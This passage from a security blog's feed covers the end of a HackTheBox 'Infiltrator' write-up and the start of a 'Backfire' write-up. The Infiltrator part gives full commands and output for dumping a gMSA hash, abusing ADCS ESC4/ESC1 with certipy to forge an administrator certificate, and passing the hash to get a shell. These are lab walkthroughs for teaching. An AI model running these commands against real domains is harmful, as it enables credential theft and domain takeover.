class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\lan_managment:l@n_M@an!1331 </span></code></pre></div></div> <p>It says RDP works, but I wasn’t able to get a connection.</p> <h2 id="auth-as-infiltrator_svc">Auth as infiltrator_svc</h2> <h3 id="bloodhound-2">BloodHound</h3> <p>lan_managment has <code class="language-plaintext highlighter-rouge">ReadGMSAPassword</code> over the infiltrator_svc$ account:</p> <picture> <source type="image/webp" srcset="/img/image-20240907154550774.webp" /> <img loading="lazy" src="/img/image-20240907154550774.png" alt="image-20240907154550774" class="include_image " /> </picture> <h3 id="dump-hash">Dump Hash</h3> <p>A group Managed Service Account (gMSA) is an account that has it’s password managed automatically by the domain. It allows these accounts to set very strong passwords, and gives permissions to other accounts to access them as needed. I’ve shown this a couple times, most recently on <a href="/2024/03/30/htb-rebound.html#auth-as-delegator">Rebound</a>.</p> <p>The simplest way to grab the NTLM for the target account is using <code class="language-plaintext highlighter-rouge">netexec</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ldap infiltrator.htb <span class="nt">-u</span> lan_managment <span class="nt">-p</span> <span class="s1">'l@n_M@an!1331'</span> <span class="nt">--gmsa</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">LDAPS </span><span class="go"> 10.10.11.31 636 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\lan_managment:l@n_M@an!1331 </span><span class="netexec-protocol">LDAPS </span><span class="go"> 10.10.11.31 636 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Getting GMSA Passwords </span><span class="netexec-protocol">LDAPS </span><span class="go"> 10.10.11.31 636 DC01 Account: infiltrator_svc$ NTLM: 9ae7de37439f359608eccf2cff5d32b9 </span></code></pre></div></div> <p>There’s also tools like <a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper</a> that can also do it:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>python gMSADumper.py <span class="nt">-u</span> lan_managment <span class="nt">-p</span> <span class="s1">'l@n_M@an!1331'</span> <span class="nt">-d</span> infiltrator.htb <span class="go">Users or groups who can read password for infiltrator_svc$: &gt; lan_managment infiltrator_svc$:::9ae7de37439f359608eccf2cff5d32b9 infiltrator_svc$:aes256-cts-hmac-sha1-96:efa1fa0fcbe57177f6f89d8513d16cbbb673ed8b85a137e5eb06baefdd3c0d27 infiltrator_svc$:aes128-cts-hmac-sha1-96:4d556ec8ebc73e358d05430c7696f1f0 </span></code></pre></div></div> <h3 id="validate-hash">Validate Hash</h3> <p><code class="language-plaintext highlighter-rouge">netexec</code> shows the hash works for SMB and LDAP:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> <span class="s1">'infiltrator_svc$'</span> <span class="nt">-H</span> 9ae7de37439f359608eccf2cff5d32b9 <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\infiltrator_svc$:9ae7de37439f359608eccf2cff5d32b9 </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ldap infiltrator.htb <span class="nt">-u</span> <span class="s1">'infiltrator_svc$'</span> <span class="nt">-H</span> 9ae7de37439f359608eccf2cff5d32b9 <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">LDAP </span><span class="go"> 10.10.11.31 389 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\infiltrator_svc$:9ae7de37439f359608eccf2cff5d32b9 </span></code></pre></div></div> <p>It doesn’t work over WinRM, and RDP shows a false positive:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm infiltrator.htb <span class="nt">-u</span> <span class="s1">'infiltrator_svc$'</span> <span class="nt">-H</span> 9ae7de37439f359608eccf2cff5d32b9 <span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb) </span><span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> infiltrator.htb\infiltrator_svc$:9ae7de37439f359608eccf2cff5d32b9 </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec rdp infiltrator.htb <span class="nt">-u</span> <span class="s1">'infiltrator_svc$'</span> <span class="nt">-H</span> 9ae7de37439f359608eccf2cff5d32b9 <span class="netexec-protocol">RDP </span><span class="go"> 10.10.11.31 3389 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True) </span><span class="netexec-protocol">RDP </span><span class="go"> 10.10.11.31 3389 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\infiltrator_svc$:9ae7de37439f359608eccf2cff5d32b9 </span></code></pre></div></div> <h2 id="shell-as-administrator">Shell as Administrator</h2> <h3 id="adcs-enumeration">ADCS Enumeration</h3> <p>Given that this is a domain controller, it’s not surprising that ADCS is available:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ldap infiltrator.htb <span class="nt">-u</span> <span class="s1">'infiltrator_svc$'</span> <span class="nt">-H</span> 9ae7de37439f359608eccf2cff5d32b9 <span class="nt">-M</span> adcs <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">LDAP </span><span class="go"> 10.10.11.31 389 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\infiltrator_svc$:9ae7de37439f359608eccf2cff5d32b9 </span><span class="netexec-protocol">ADCS </span><span class="go"> 10.10.11.31 389 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)' </span><span class="netexec-protocol">ADCS </span><span class="go"> 10.10.11.31 389 DC01 Found PKI Enrollment Server: dc01.infiltrator.htb </span><span class="netexec-protocol">ADCS </span><span class="go"> 10.10.11.31 389 DC01 Found CN: infiltrator-DC01-CA </span></code></pre></div></div> <p><a href="https://github.com/ly4k/Certipy">Certipy</a> will use these creds to look for vulnerable configurations:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy find <span class="nt">-vulnerable</span> <span class="nt">-dc-ip</span> 10.10.11.31 <span class="nt">-u</span> <span class="s1">'infiltrator_svc$'</span> <span class="nt">-hashes</span> :9ae7de37439f359608eccf2cff5d32b9 <span class="nt">-stdout</span> <span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA [!] Got error while trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for 'infiltrator-DC01-CA' via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Got CA configuration for 'infiltrator-DC01-CA' [*] Enumeration output: Certificate Authorities 0 CA Name : infiltrator-DC01-CA DNS Name : dc01.infiltrator.htb Certificate Subject : CN=infiltrator-DC01-CA, DC=infiltrator, DC=htb Certificate Serial Number : 724BCC4E21EA6681495514E0FD8A5149 Certificate Validity Start : 2023-12-08 01:42:38+00:00 Certificate Validity End : 2124-08-04 18:55:57+00:00 Web Enrollment : Disabled User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : INFILTRATOR.HTB\Administrators Access Rights ManageCertificates : INFILTRATOR.HTB\Administrators INFILTRATOR.HTB\Domain Admins INFILTRATOR.HTB\Enterprise Admins ManageCa : INFILTRATOR.HTB\Administrators INFILTRATOR.HTB\Domain Admins INFILTRATOR.HTB\Enterprise Admins Enroll : INFILTRATOR.HTB\Authenticated Users Certificate Templates 0 Template Name : Infiltrator_Template Display Name : Infiltrator_Template Certificate Authorities : infiltrator-DC01-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : PublishToDs PendAllRequests IncludeSymmetricAlgorithms Private Key Flag : ExportableKey Extended Key Usage : Smart Card Logon Server Authentication KDC Authentication Client Authentication Requires Manager Approval : True Requires Key Archival : False Authorized Signatures Required : 1 Validity Period : 99 years Renewal Period : 650430 hours Minimum RSA Key Length : 2048 Permissions Object Control Permissions Owner : INFILTRATOR.HTB\Local System Full Control Principals : INFILTRATOR.HTB\Domain Admins INFILTRATOR.HTB\Enterprise Admins INFILTRATOR.HTB\Local System Write Owner Principals : INFILTRATOR.HTB\infiltrator_svc INFILTRATOR.HTB\Domain Admins INFILTRATOR.HTB\Enterprise Admins INFILTRATOR.HTB\Local System Write Dacl Principals : INFILTRATOR.HTB\infiltrator_svc INFILTRATOR.HTB\Domain Admins INFILTRATOR.HTB\Enterprise Admins INFILTRATOR.HTB\Local System Write Property Principals : INFILTRATOR.HTB\infiltrator_svc INFILTRATOR.HTB\Domain Admins INFILTRATOR.HTB\Enterprise Admins INFILTRATOR.HTB\Local System [!] Vulnerabilities ESC4 : 'INFILTRATOR.HTB\\infiltrator_svc' has dangerous permissions </span></code></pre></div></div> <p>There’s an ESC4 risk for this account.</p> <h3 id="esc4-exploit">ESC4 Exploit</h3> <p>I recently showed the ESC4 exploit on <a href="/2025/05/24/htb-escapetwo.html#">EscapeTwo</a> (which came out way after Infiltrator). ESC4 says that the infiltrator_svc$ account has excessive permissions over a template, <code class="language-plaintext highlighter-rouge">Infiltrator_Template</code>. This account can modify it to make it vulnerable to other ESC attacks.</p> <p><code class="language-plaintext highlighter-rouge">certipy template</code> will do just that:</p> <div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy template <span class="nt">-u</span> <span class="s1">'infiltrator_svc$'</span> <span class="nt">-hashes</span> :9ae7de37439f359608eccf2cff5d32b9 <span class="nt">-dc-ip</span> 10.10.11.31 <span class="nt">-template</span> Infiltrator_Template <span class="nt">-save-old</span> <span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Saved old configuration for 'Infiltrator_Template' to 'Infiltrator_Template.json' [*] Updating certificate template 'Infiltrator_Template' [*] Successfully updated 'Infiltrator_Template' </span></code></pre></div></div> <p>The <code class="language-plaintext highlighter-rouge">template</code> command has changed a bit since the release of version 5 of <code class="language-plaintext highlighter-rouge">certipy</code> For v5.0.2, that command would replace <code class="language-plaintext highlighter-rouge">-save-old</code> with <code class="language-plaintext highlighter-rouge">-write-default-configuration -no-save</code>.</p> <p>If I re-run the check for vulnerable templates, this one is now very vulnerable:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy find <span class="nt">-vulnerable</span> <span class="nt">-u</span> <span class="s1">'infiltrator_svc$'</span> <span class="nt">-hashes</span> :9ae7de37439f359608eccf2cff5d32b9 <span class="nt">-dc-ip</span> 10.10.11.31 <span class="nt">-stdout</span> <span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA [!] Got error while trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for 'infiltrator-DC01-CA' via RRP [*] Got CA configuration for 'infiltrator-DC01-CA' [*] Enumeration output: Certificate Authorities 0 CA Name : infiltrator-DC01-CA DNS Name : dc01.infiltrator.htb Certificate Subject : CN=infiltrator-DC01-CA, DC=infiltrator, DC=htb Certificate Serial Number : 724BCC4E21EA6681495514E0FD8A5149 Certificate Validity Start : 2023-12-08 01:42:38+00:00 Certificate Validity End : 2124-08-04 18:55:57+00:00 Web Enrollment : Disabled User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : INFILTRATOR.HTB\Administrators Access Rights ManageCertificates : INFILTRATOR.HTB\Administrators INFILTRATOR.HTB\Domain Admins INFILTRATOR.HTB\Enterprise Admins ManageCa : INFILTRATOR.HTB\Administrators INFILTRATOR.HTB\Domain Admins INFILTRATOR.HTB\Enterprise Admins Enroll : INFILTRATOR.HTB\Authenticated Users Certificate Templates 0 Template Name : Infiltrator_Template Display Name : Infiltrator_Template Certificate Authorities : infiltrator-DC01-CA Enabled : True Client Authentication : True Enrollment Agent : True Any Purpose : True Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : None Private Key Flag : ExportableKey Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Validity Period : 5 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Permissions Object Control Permissions Owner : INFILTRATOR.HTB\Local System Full Control Principals : INFILTRATOR.HTB\Authenticated Users Write Owner Principals : INFILTRATOR.HTB\Authenticated Users Write Dacl Principals : INFILTRATOR.HTB\Authenticated Users Write Property Principals : INFILTRATOR.HTB\Authenticated Users [!] Vulnerabilities ESC1 : 'INFILTRATOR.HTB\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication ESC2 : 'INFILTRATOR.HTB\\Authenticated Users' can enroll and template can be used for any purpose ESC3 : 'INFILTRATOR.HTB\\Authenticated Users' can enroll and template has Certificate Request Agent EKU set ESC4 : 'INFILTRATOR.HTB\\Authenticated Users' has dangerous permissions </span></code></pre></div></div> <p>To exploit ESC1, I ask certificate for the administrator:</p> <div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy req <span class="nt">-u</span> <span class="s1">'infiltrator_svc$'</span> <span class="nt">-hashes</span> :9ae7de37439f359608eccf2cff5d32b9 <span class="nt">-dc-ip</span> 10.10.11.31 <span class="nt">-ca</span> infiltrator-DC01-CA <span class="nt">-target</span> dc01.infiltrator.htb <span class="nt">-template</span> Infiltrator_Template <span class="nt">-upn</span> administrator@infiltrator.htb <span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Successfully requested certificate [*] Request ID is 12 [*] Got certificate with UPN 'administrator@infiltrator.htb' [*] Certificate has no object SID [*] Saved certificate and private key to 'administrator.pfx' </span></code></pre></div></div> <p>The <code class="language-plaintext highlighter-rouge">auth</code> subcommand takes that <code class="language-plaintext highlighter-rouge">.pfx</code> file and returns a TGT and the NTLM hash:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> 10.10.11.31 <span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: administrator@infiltrator.htb [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to 'administrator.ccache' [*] Trying to retrieve NT hash for 'administrator' [*] Got hash for 'administrator@infiltrator.htb': aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1 </span></code></pre></div></div> <p>In theory I should then put the original back (though there’s a very quick scheduled task doing that on Infiltrator, so I’m unlikely to actually need this):</p> <div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy template <span class="nt">-u</span> <span class="s1">'infiltrator_svc$'</span> <span class="nt">-hashes</span> :9ae7de37439f359608eccf2cff5d32b9 <span class="nt">-dc-ip</span> 10.10.11.31 <span class="nt">-template</span> Infiltrator_Template <span class="nt">-configuration</span> Infiltrator_Template.json <span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Updating certificate template 'Infiltrator_Template' [*] Successfully updated 'Infiltrator_Template' </span></code></pre></div></div> <h3 id="validate-creds-1">Validate Creds</h3> <p>I’ll check this hash using <code class="language-plaintext highlighter-rouge">netexec</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb infiltrator.htb <span class="nt">-u</span> administrator <span class="nt">-H</span> aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1 <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\administrator:1356f502d2764368302ff0369b1121a1 </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go"> </span></code></pre></div></div> <p>That shows admin access! It works for WinRM as well:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec winrm infiltrator.htb <span class="nt">-u</span> administrator <span class="nt">-H</span> aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1 <span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb) </span><span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\administrator:1356f502d2764368302ff0369b1121a1 </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go"> </span></code></pre></div></div> <h3 id="shell-2">Shell</h3> <p>The hash works with Evil-WinRM:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> infiltrator.htb <span class="nt">-u</span> administrator <span class="nt">-H</span> 1356f502d2764368302ff0369b1121a1 <span class="go"> Evil-WinRM shell v3.5 Info: Establishing connection to remote endpoint </span><span class="gp">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span><span class="w"> </span></code></pre></div></div> <p>And I can read <code class="language-plaintext highlighter-rouge">root.txt</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">root.txt</span><span class="w"> </span><span class="go">c7a91bd4************************ </span></code></pre></div></div> ]]>
</content>
<author>
<name/>
</author>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="htb-infiltrator"/>
<category term="pentest"/>
<category term="bug-bounty"/>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="htb-infiltrator"/>
<category term="nmap"/>
<category term="windows"/>
<category term="active-directory"/>
<category term="feroxbuster"/>
<category term="netexec"/>
<category term="username-anarchy"/>
<category term="kerbrute"/>
<category term="as-rep-roast"/>
<category term="hashcat"/>
<category term="password-spray"/>
<category term="protected-users"/>
<category term="bloodhound"/>
<category term="bloodhound-python"/>
<category term="genericall"/>
<category term="genericall-ou"/>
<category term="forcechangepassword"/>
<category term="addself"/>
<category term="dacledit"/>
<category term="shadow-credential"/>
<category term="bloodyad"/>
<category term="output-messagenger"/>
<category term="chisel"/>
<category term="foxy-proxy"/>
<category term="dotpeek"/>
<category term="reverse-engineering"/>
<category term="cyberchef"/>
<category term="aes-decrypt"/>
<category term="rdp"/>
<category term="pcap"/>
<category term="bitlocker"/>
<category term="secretsdump"/>
<category term="ntds"/>
<category term="ntds-sqlite"/>
<category term="gmsadumper"/>
<category term="adcs"/>
<category term="esc4"/>
<category term="htb-absolute"/>
<category term="htb-rebound"/>
<category term="htb-escapetwo"/>
<summary type="html">
<![CDATA[ Infiltrator is a very long box. It starts out with some people on a website. I’ll use those names to make usernames and brute force to find the username format. Then I’ll AS-REP-Roast to get initial creds. That user doesn’t have much, but I’ll spray the password around the other domain users and find another account with the same. This user is in the protected users group, so I’ll need to authenticate with Kerberos. From that user, Bloodhound data shows a path to another user where I’ll get a shell. There I’ll find Output Messager installed, and set up tunnels to access. I’ll find creds for a couple more pivots in the chat (including in a .NET exe from the chat), before exploiting the calendar functionality to get execution and another shell. In this users received files I’ll find a PCAP, and pull both more creds and a BitLocker backup file. I’ll find a recovery key in the backup, and connect with RDP and decrpyt the E drive to get access to a backup of the registry and NTDS information. I’ll dump that to get a shell as the next user, who has ReadGMSAPassword on a service account. That user can exploit ESC4 in the ADCS to get administrator access. ]]>
</summary>
<media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xdf.gitlab.io/img/infiltrator-cover.png"/>
<media:content xmlns:media="http://search.yahoo.com/mrss/" medium="image" url="https://0xdf.gitlab.io/img/infiltrator-cover.png"/>
</entry>
<entry>
<title type="html">HTB: Backfire</title>
<link href="https://0xdf.gitlab.io/2025/06/07/htb-backfire.html" rel="alternate" type="text/html" title="HTB: Backfire"/>
<published>2025-06-07T13:45:00+00:00</published>
<updated>2025-06-07T13:45:00+00:00</updated>
<id>https://0xdf.gitlab.io/2025/06/07/htb-backfire</id>
<content type="html" xml:base="https://0xdf.gitlab.io/2025/06/07/htb-backfire.html">
<![CDATA[ <picture> <source type="image/webp" srcset="/img/backfire-cover.webp" /> <img loading="lazy" src="/img/backfire-cover.png" alt="Backfire" style="float: right; margin-right:50px; margin-left:50px; height:150px;" class="include_image " /> </picture> <p>Backfire is all about exploiting red team infrastructure, first Havoc, and then HardHatC2. I’ll start with a Havoc server and leak the configuration from the website. I’ll exploit an SSRF vulnerability to get access to the admin port internally. There’s an authenticated RCE vulnerability on this port, but it involves sending payloads into a websocket. I’ll create a chained exploit using the SSRF to stand up and communicate over a websocket to get command injection and a shell. From here, I’ll find an instance of HardHatC2, and exploit the default JWT secret to forge cookies and get access. Inside the C2 admin panel, I’ll get a shell as the next user. Finally, I’ll abuse a sudo rule that allows saving the firewall rules to get arbitrary write, and get a shell as root.</p> <h2 id="box-info">Box Info</h2> <!-- https://app.hackthebox.com/machines/643 --> <table> <thead> <tr> <th>Name</th> <th style="text-align: right"><a href="https://hackthebox.com/machines/backfire" target="_blank" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9">Backfire</a> <a href="https://hackthebox.com/machines/backfire" target="_blank"><picture style="float: right; padding-left: 20px;"><source type="image/webp" srcset="/icons/box-backfire.webp" /> <img src="/icons/box-backfire.png" alt="Backfire" class="img-av" /></picture></a><br /><a href="https://hackthebox.com/machines/backfire" target="_blank" style="font-size: small; color: white;">Play on HackTheBox</a></th> </tr> </thead> <tbody> <tr> <td>Release Date</td> <td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1879936684332060734">18 Jan 2025</a></td> </tr> <tr> <td>Retire Date</td> <td style="text-align: right">07 Jun 2025</td> </tr> <tr> <td>OS</td> <td style="text-align: right">Linux <picture><source type="image/webp" srcset="/icons/Linux.webp" /><img src="/icons/Linux.png" alt="Linux" class="img-os" /></picture></td> </tr> <tr> <td>Base Points</td> <td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td> </tr> <tr> <td>Rated Difficulty</td> <td style="text-align: right"><picture><source type="image/webp" srcset="/img/backfire-diff.webp" /><img src="/img/backfire-diff.png" alt="Rated difficulty for Backfire" style="display: unset;" /></picture></td> </tr> <tr> <td>Radar Graph</td> <td style="text-align: right"><picture><source type="image/webp" srcset="/img/backfire-radar.webp" /><img src="/img/backfire-radar.png" alt="Radar chart for Backfire" style="display: unset;" /></picture></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp" /><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset" /></picture></td> <td style="text-align: right"><span class="blood-time">01:14:50</span><a href="https://app.hackthebox.com/users/848478" target="_blank" rel="noopener"><img alt="fisstech" src="https://www.hackthebox.com/badge/image/848478" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> fisstech</span></a><br /></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp" /><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset" /></picture></td> <td style="text-align: right"><span class="blood-time">02:35:22</span><a href="https://app.hackthebox.com/users/77141" target="_blank" rel="noopener"><img alt="jkr" src="https://www.hackthebox.com/badge/image/77141" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> jkr</span></a><br /></td> </tr> <tr> <td>Creators</td> <td style="text-align: right"><a href="https://app.hackthebox.com/users/49704" target="_blank" rel="noopener"><img alt="hyperreality" src="https://www.hackthebox.com/badge/image/49704" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> hyperreality</span></a><br /> <a href="https://app.hackthebox.com/users/1688469" target="_blank" rel="noopener"><img alt="chebuya" src="https://www.hackthebox.com/badge/image/1688469" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> chebuya</span></a><br /></td> </tr> </tbody> </table> <h2 id="recon">Recon</h2> <h3 id="nmap">nmap</h3> <p><code class="language-plaintext highlighter-rouge">nmap</code> finds three open TCP ports, SSH (22), HTTPS (443) and HTTP (8000), as well as two filtered ports (5000 and 7096):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.49 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 13:29 EST Nmap scan report for 10.10.11.49 Host is up (0.089s latency). Not shown: 65530 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 443/tcp open https 5000/tcp filtered upnp 7096/tcp filtered unknown 8000/tcp open http-alt Nmap done: 1 IP address (1 host up) scanned in 6.89 seconds </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,443,8000 <span class="nt">-sCV</span> 10.10.11.49 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 13:30 EST Nmap scan report for 10.10.11.49 Host is up (0.085s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0) | ssh-hostkey: | 256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA) |_ 256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519) 443/tcp open ssl/http nginx 1.22.1 | ssl-cert: Subject: commonName=127.0.0.1/stateOrProvinceName=Illinois/countryName=US | Subject Alternative Name: IP Address:127.0.0.1 | Not valid before: 2024-07-16T17:28:10 |_Not valid after: 2027-07-16T17:28:10 |_ssl-date: TLS randomness does not represent time |_http-server-header: nginx/1.22.1 | tls-alpn: | http/1.1 | http/1.0 |_ http/0.9 |_http-title: 404 Not Found 8000/tcp open http nginx 1.22.1 |_http-title: Index of / |_http-server-header: nginx/1.22.1 |_http-open-proxy: Proxy might be redirecting requests | http-ls: Volume / | SIZE TIME FILENAME | 1559 17-Dec-2024 11:31 disable_tls.patch | 875 17-Dec-2024 11:34 havoc.yaotl |_ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.12 seconds </span></code></pre></div></div> <p>Based on the <a href="/cheatsheets/os#debian">OpenSSH and nginx versions</a>, the host is likely running Debian 12 bookworm. There’s no sign of host-based routing or any kind of domain name, so I’ll proceed by targeting the IP.</p> <h3 id="website---tcp-443">Website - TCP 443</h3> <h4 id="site">Site</h4> <p>Visiting <code class="language-plaintext highlighter-rouge">https://10.10.11.49/</code> returns the <a 